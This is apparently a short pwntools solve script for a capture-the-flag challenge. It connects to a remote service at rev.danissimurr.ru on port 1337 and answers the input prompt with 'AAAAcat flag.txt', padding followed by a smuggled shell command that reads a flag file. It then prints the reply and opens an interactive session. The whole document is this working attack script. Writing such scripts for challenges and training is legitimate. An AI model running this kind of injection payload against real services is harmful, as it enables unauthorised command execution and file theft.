from pwn import *

# p = process('./string')
p = remote("rev.danissimurr.ru", 1337)
p.recvuntil(b'Input:\n')
p.sendline(b'AAAAcat flag.txt')

data = p.recvall(timeout=2)
print(data.decode())

p.interactive()
